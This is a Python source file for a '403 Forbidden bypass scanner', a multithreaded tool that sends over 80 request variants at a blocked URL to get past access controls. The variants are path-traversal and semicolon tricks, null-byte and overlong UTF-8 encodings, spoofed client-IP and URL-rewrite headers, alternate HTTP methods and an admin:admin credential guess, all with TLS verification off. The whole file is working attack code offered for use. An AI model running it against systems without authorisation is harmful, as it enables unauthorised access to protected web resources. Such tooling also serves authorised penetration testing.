"""403 Forbidden bypass scanner - Tests 80+ techniques to bypass 403 responses."""

import httpx
from urllib.parse import urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional


class ForbiddenBypass:
    """Scanner for bypassing 403 Forbidden responses using multiple techniques."""

    def __init__(self, threads: int = 15, timeout: int = 10):
        """
        Initialize ForbiddenBypass scanner.

        Args:
            threads: Number of concurrent threads.
            timeout: HTTP request timeout in seconds.
        """
        self.threads = threads
        self.timeout = timeout
        self.findings: List[Dict[str, Any]] = []

    def scan(self, url: str) -> List[Dict[str, Any]]:
        """
        Run all 80+ bypass techniques against a 403 URL.

        Args:
            url: URL that returns 403 Forbidden.

        Returns:
            List of successful bypasses with technique details.
        """
        self.findings = []
        print(f"[*] Starting 403 bypass scan on: {url}")

        # Verify the URL actually returns 403
        baseline = self._check_baseline(url)
        if baseline and baseline.status_code != 403:
            print(f"[!] Warning: URL returns {baseline.status_code}, not 403")

        all_tests = []
        all_tests.extend(self._generate_path_tricks(url))
        all_tests.extend(self._generate_header_tricks(url))
        all_tests.extend(self._generate_method_tricks(url))
        all_tests.extend(self._generate_encoding_tricks(url))

        print(f"[*] Testing {len(all_tests)} bypass techniques...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {}
            for test in all_tests:
                future = executor.submit(
                    self._execute_test,
                    test["url"],
                    test.get("method", "GET"),
                    test.get("headers", {}),
                    test.get("data", None),
                )
                futures[future] = test

            for future in as_completed(futures):
                test = futures[future]
                try:
                    response = future.result()
                    if response and response.status_code not in [403, 401, 500, 502, 503, 504]:
                        self.findings.append({
                            "technique": test["technique"],
                            "category": test["category"],
                            "status_code": response.status_code,
                            "bypass_url": test["url"],
                            "method": test.get("method", "GET"),
                            "headers": test.get("headers", {}),
                            "evidence": f"Length: {len(response.content)}, Status: {response.status_code}",
                            "response_length": len(response.content),
                        })
                except Exception:
                    pass

        # Sort by status code (200s first)
        self.findings.sort(key=lambda x: x["status_code"])
        print(f"[+] Found {len(self.findings)} potential bypasses.")
        return self.findings

    def _generate_path_tricks(self, url: str) -> List[Dict[str, Any]]:
        """Generate 40+ path-based bypass tests."""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path.rstrip("/")
        path_name = path.split("/")[-1] if path else ""
        parent = "/".join(path.split("/")[:-1]) if "/" in path else ""

        tricks = []
        path_variations = [
            (f"{path}/", "Trailing slash"),
            (f"{path}//", "Double trailing slash"),
            (f"{path}///", "Triple trailing slash"),
            (f"{path}/.", "Trailing dot"),
            (f"{path}/..", "Trailing dotdot"),
            (f"{path}/./", "Dot slash"),
            (f"{path}/../{path_name}", "Path traversal back"),
            (f"{path}..;/", "Semicolon dotdot"),
            (f"{path};/", "Semicolon slash"),
            (f"{path}/;/", "Slash semicolon slash"),
            (f"{path}/.;/", "Dot semicolon"),
            (f"{path}/..;/", "Dotdot semicolon"),
            (f"//{parsed.netloc}{path}", "Double slash host"),
            (f"{path}%20", "Space encoding"),
            (f"{path}%09", "Tab encoding"),
            (f"{path}%00", "Null byte"),
            (f"{path}%0a", "Newline encoding"),
            (f"{path}%0d", "CR encoding"),
            (f"{path}.html", "HTML extension"),
            (f"{path}.php", "PHP extension"),
            (f"{path}.json", "JSON extension"),
            (f"{path}.xml", "XML extension"),
            (f"{path}.css", "CSS extension"),
            (f"{path}.js", "JS extension"),
            (f"{path}?", "Question mark"),
            (f"{path}??", "Double question mark"),
            (f"{path}?anything=1", "Query param"),
            (f"{path}#", "Hash fragment"),
            (f"{path}#fragment", "Named fragment"),
            (f"{path}/*", "Wildcard"),
            (f"{path}/**", "Double wildcard"),
            (f"/{path_name.upper()}" if path_name else f"{path}", "Uppercase path"),
            (f"/{path_name.capitalize()}" if path_name else f"{path}", "Capitalized path"),
            (f"{parent}/;{path_name}", "Semicolon before name"),
            (f"{parent}/.;/{path_name}", "Dot semicolon parent"),
            (f"{path}..;..;/", "Double semicolon dotdot"),
            (f"{path}....//", "Quad dot double slash"),
            (f"{path}/%2e/", "Encoded dot"),
            (f"{path}/%2e%2e/", "Encoded dotdot"),
            (f"{path}/.%2e/", "Mixed dot encoding"),
            (f"{path}%2f", "Encoded slash suffix"),
            (f"{path}%5c", "Backslash encoding"),
        ]

        for variation, desc in path_variations:
            tricks.append({
                "url": base + variation,
                "technique": f"Path: {desc} ({variation})",
                "category": "path",
            })

        return tricks

    def _generate_header_tricks(self, url: str) -> List[Dict[str, Any]]:
        """Generate 25+ header-based bypass tests."""
        parsed = urlparse(url)
        path = parsed.path

        header_sets = [
            ({"X-Forwarded-For": "127.0.0.1"}, "X-Forwarded-For: 127.0.0.1"),
            ({"X-Forwarded-For": "10.0.0.1"}, "X-Forwarded-For: 10.0.0.1"),
            ({"X-Forwarded-For": "172.16.0.1"}, "X-Forwarded-For: 172.16.0.1"),
            ({"X-Forwarded-For": "192.168.0.1"}, "X-Forwarded-For: 192.168.0.1"),
            ({"X-Forwarded-For": "0.0.0.0"}, "X-Forwarded-For: 0.0.0.0"),
            ({"X-Original-URL": path}, "X-Original-URL"),
            ({"X-Rewrite-URL": path}, "X-Rewrite-URL"),
            ({"X-Real-IP": "127.0.0.1"}, "X-Real-IP: 127.0.0.1"),
            ({"X-Custom-IP-Authorization": "127.0.0.1"}, "X-Custom-IP-Authorization"),
            ({"X-Originating-IP": "127.0.0.1"}, "X-Originating-IP"),
            ({"X-Remote-IP": "127.0.0.1"}, "X-Remote-IP"),
            ({"X-Client-IP": "127.0.0.1"}, "X-Client-IP"),
            ({"X-Host": "localhost"}, "X-Host: localhost"),
            ({"X-Forwarded-Host": "localhost"}, "X-Forwarded-Host: localhost"),
            ({"X-ProxyUser-Ip": "127.0.0.1"}, "X-ProxyUser-Ip"),
            ({"X-Remote-Addr": "127.0.0.1"}, "X-Remote-Addr"),
            ({"True-Client-IP": "127.0.0.1"}, "True-Client-IP"),
            ({"Cluster-Client-IP": "127.0.0.1"}, "Cluster-Client-IP"),
            ({"X-HTTP-Method-Override": "GET"}, "X-HTTP-Method-Override: GET"),
            ({"X-Method-Override": "POST"}, "X-Method-Override: POST"),
            ({"X-Original-Method": "PUT"}, "X-Original-Method: PUT"),
            ({"Referer": url}, "Referer: self"),
            ({"Referer": f"https://{parsed.netloc}/"}, "Referer: origin"),
            ({"X-Requested-With": "XMLHttpRequest"}, "X-Requested-With: XMLHttpRequest"),
            ({"Content-Type": "application/json"}, "Content-Type: JSON"),
            ({"Content-Type": "application/xml"}, "Content-Type: XML"),
            ({"X-Forwarded-Proto": "https"}, "X-Forwarded-Proto: https"),
            ({"X-Forwarded-Scheme": "https"}, "X-Forwarded-Scheme: https"),
            ({"Authorization": "Basic YWRtaW46YWRtaW4="}, "Basic Auth admin:admin"),
            ({"X-Original-URL": "/", "X-Rewrite-URL": path}, "X-Original-URL + X-Rewrite-URL combo"),
        ]

        tricks = []
        for headers, desc in header_sets:
            tricks.append({
                "url": url,
                "headers": headers,
                "technique": f"Header: {desc}",
                "category": "header",
            })

        return tricks

    def _generate_method_tricks(self, url: str) -> List[Dict[str, Any]]:
        """Generate HTTP method bypass tests."""
        methods = [
            "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS",
            "HEAD", "TRACE", "CONNECT", "PROPFIND", "PROPPATCH",
            "MKCOL", "COPY", "MOVE", "LOCK", "UNLOCK", "SEARCH",
            "PURGE", "LINK", "UNLINK",
        ]

        tricks = []
        for method in methods:
            tricks.append({
                "url": url,
                "method": method,
                "technique": f"Method: {method}",
                "category": "method",
            })

        # Method override via headers with POST
        override_headers = [
            {"X-HTTP-Method-Override": "GET"},
            {"X-HTTP-Method": "GET"},
            {"X-Method-Override": "GET"},
        ]
        for headers in override_headers:
            header_name = list(headers.keys())[0]
            tricks.append({
                "url": url,
                "method": "POST",
                "headers": headers,
                "technique": f"Method: POST with {header_name}",
                "category": "method",
            })

        return tricks

    def _generate_encoding_tricks(self, url: str) -> List[Dict[str, Any]]:
        """Generate encoding-based bypass tests."""
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path.rstrip("/")
        path_name = path.split("/")[-1] if path else ""

        encoding_variations = [
            (quote(path, safe="/").replace("%2F", "/"), "Single URL encode"),
            (quote(quote(path, safe=""), safe=""), "Double URL encode"),
            (path.replace("/", "%2f"), "Encoded slashes"),
            (path.replace("/", "%252f"), "Double encoded slashes"),
            (path.replace("/", "%c0%af"), "Overlong UTF-8 slash"),
            (path.replace("/", "%e0%80%af"), "3-byte overlong slash"),
            (path.replace("/", "%c0%2f"), "Modified UTF-8 slash"),
            (f"/{quote(path_name, safe='')}", "Encoded path name"),
            (f"/{quote(quote(path_name, safe=''), safe='')}", "Double encoded path name"),
            (path + "%23", "Encoded hash"),
            (path + "%3f", "Encoded question mark"),
            (path + "%26", "Encoded ampersand"),
            (path.replace(path_name, path_name.encode().hex()), "Hex encoded name"),
        ]

        tricks = []
        for variation, desc in encoding_variations:
            tricks.append({
                "url": base + variation,
                "technique": f"Encoding: {desc}",
                "category": "encoding",
            })

        return tricks

    def _check_baseline(self, url: str) -> Optional[httpx.Response]:
        """Check the baseline response of the URL."""
        try:
            with httpx.Client(timeout=self.timeout, verify=False) as client:
                return client.get(url)
        except Exception:
            return None

    def _execute_test(
        self,
        url: str,
        method: str = "GET",
        headers: Dict[str, str] = None,
        data: Optional[str] = None,
    ) -> Optional[httpx.Response]:
        """
        Execute a single bypass test.

        Args:
            url: URL to test.
            method: HTTP method.
            headers: Custom headers.
            data: Request body data.

        Returns:
            Response object or None on failure.
        """
        try:
            with httpx.Client(
                timeout=self.timeout,
                follow_redirects=False,
                verify=False,
            ) as client:
                response = client.request(
                    method,
                    url,
                    headers=headers or {},
                    content=data,
                )
                return response
        except Exception:
            return None
